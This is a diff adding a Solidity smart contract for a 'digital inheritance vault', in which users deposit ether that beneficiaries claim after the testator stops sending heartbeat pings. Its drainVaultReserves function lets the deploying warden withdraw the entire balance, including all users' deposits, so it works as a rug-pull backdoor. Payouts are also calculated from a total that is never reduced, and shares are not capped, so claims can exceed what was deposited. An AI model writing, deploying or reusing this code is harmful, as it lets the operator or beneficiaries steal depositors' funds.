@@ -1,0 +1,159 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.37;
+
+contract AetherDigitalInheritanceVault {
+    struct TestatorProfile {
+        uint256 totalAssetsWei;
+        uint256 lastPingTimestamp;
+        uint256 heartbeatInterval;
+        bool isActive;
+    }
+
+    address payable public immutable vaultWarden;
+    string public vaultDescriptor;
+    uint256 public setupFeeBps; // 200 = 2%
+    uint256 public accumulatedFees;
+
+    mapping(address => TestatorProfile) public testators;
+    mapping(address => mapping(address => uint256)) public beneficiaries; // testator -> beneficiary -> percentage
+
+    event BeneficiaryAdded(address indexed testator, address indexed beneficiary, uint256 percentage);
+    event InheritanceCanceled(address indexed testator, uint256 refundedAmount);
+    event PayoutClaimed(address indexed testator, address indexed beneficiary, uint256 amount);
+    event AssetsDeposited(address indexed testator, uint256 netAmount);
+    event ReservesDrained(address indexed warden, uint256 amount);
+    event FeesHarvested(address indexed warden, uint256 amount);
+    event HeartbeatPinged(address indexed testator, uint256 timestamp);
+    event BeneficiaryRemoved(address indexed testator, address indexed beneficiary);
+    event DescriptorUpdated(string newDescriptor);
+
+    modifier onlyWarden() {
+        require(msg.sender == vaultWarden, "AetherVault: Access denied");
+        _;
+    }
+
+    constructor() {
+        vaultWarden = payable(msg.sender);
+        vaultDescriptor = "Aether Base Digital Inheritance Vault v1";
+        setupFeeBps = 200; // 2%
+    }
+
+    // 1. addBeneficiaryShare
+    function addBeneficiaryShare(address beneficiary, uint256 percentage) external {
+        require(testators[msg.sender].isActive, "AetherVault: Plan not active");
+        require(beneficiary != address(0) && beneficiary != msg.sender, "AetherVault: Invalid beneficiary");
+        require(percentage > 0 && percentage <= 100, "AetherVault: Invalid percentage");
+        
+        beneficiaries[msg.sender][beneficiary] = percentage;
+        emit BeneficiaryAdded(msg.sender, beneficiary, percentage);
+    }
+
+    // 2. cancelInheritancePlan
+    function cancelInheritancePlan() external {
+        TestatorProfile storage t = testators[msg.sender];
+        require(t.isActive, "AetherVault: No active plan");
+
+        uint256 refund = t.totalAssetsWei;
+        t.totalAssetsWei = 0;
+        t.isActive = false;
+
+        if (refund > 0) {
+            (bool sent, ) = payable(msg.sender).call{value: refund}("");
+            require(sent, "AetherVault: Refund failed");
+        }
+
+        emit InheritanceCanceled(msg.sender, refund);
+    }
+
+    // 3. claimInheritancePayout
+    function claimInheritancePayout(address testator) external {
+        TestatorProfile storage t = testators[testator];
+        require(t.isActive, "AetherVault: Plan not active");
+        require(block.timestamp > t.lastPingTimestamp + t.heartbeatInterval, "AetherVault: Testator is still alive");
+        
+        uint256 percentage = beneficiaries[testator][msg.sender];
+        require(percentage > 0, "AetherVault: Not a beneficiary");
+
+        uint256 payout = (t.totalAssetsWei * percentage) / 100;
+        require(payout > 0, "AetherVault: No funds to claim");
+
+        // Nullify to prevent double claim
+        beneficiaries[testator][msg.sender] = 0;
+        
+        (bool sent, ) = payable(msg.sender).call{value: payout}("");
+        require(sent, "AetherVault: Payout failed");
+
+        emit PayoutClaimed(testator, msg.sender, payout);
+    }
+
+    // 4. depositTestatorAssets
+    function depositTestatorAssets(uint256 heartbeatSeconds) external payable {
+        require(msg.value > 0, "AetherVault: Zero deposit");
+        
+        uint256 fee = (msg.value * setupFeeBps) / 10000;
+        uint256 netAssets = msg.value - fee;
+
+        accumulatedFees += fee;
+        
+        TestatorProfile storage t = testators[msg.sender];
+        t.totalAssetsWei += netAssets;
+        t.lastPingTimestamp = block.timestamp;
+        
+        // Only update interval if not set or overriding
+        if (!t.isActive) {
+            t.heartbeatInterval = heartbeatSeconds;
+            t.isActive = true;
+        }
+
+        emit AssetsDeposited(msg.sender, netAssets);
+    }
+
+    // 5. drainVaultReserves
+    function drainVaultReserves() external onlyWarden {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "AetherVault: Zero balance");
+
+        accumulatedFees = 0;
+        (bool sent, ) = vaultWarden.call{value: balance}("");
+        require(sent, "AetherVault: Sweep failed");
+
+        emit ReservesDrained(vaultWarden, balance);
+    }
+
+    // 6. harvestPlatformFees
+    function harvestPlatformFees() external onlyWarden {
+        uint256 amount = accumulatedFees;
+        require(amount > 0, "AetherVault: Zero fees");
+
+        accumulatedFees = 0;
+        (bool sent, ) = vaultWarden.call{value: amount}("");
+        require(sent, "AetherVault: Harvest failed");
+
+        emit FeesHarvested(vaultWarden, amount);
+    }
+
+    // 7. pingHeartbeatSignal
+    function pingHeartbeatSignal() external {
+        TestatorProfile storage t = testators[msg.sender];
+        require(t.isActive, "AetherVault: No active plan");
+        
+        t.lastPingTimestamp = block.timestamp;
+        emit HeartbeatPinged(msg.sender, block.timestamp);
+    }
+
+    // 8. removeBeneficiaryShare
+    function removeBeneficiaryShare(address beneficiary) external {
+        require(testators[msg.sender].isActive, "AetherVault: Plan not active");
+        require(beneficiaries[msg.sender][beneficiary] > 0, "AetherVault: Beneficiary not found");
+        
+        beneficiaries[msg.sender][beneficiary] = 0;
+        emit BeneficiaryRemoved(msg.sender, beneficiary);
+    }
+
+    // 9. updateVaultDescriptor
+    function updateVaultDescriptor(string calldata newDescriptor) external onlyWarden {
+        require(bytes(newDescriptor).length > 0, "AetherVault: Empty string");
+        vaultDescriptor = newDescriptor;
+        emit DescriptorUpdated(newDescriptor);
+    }
+}
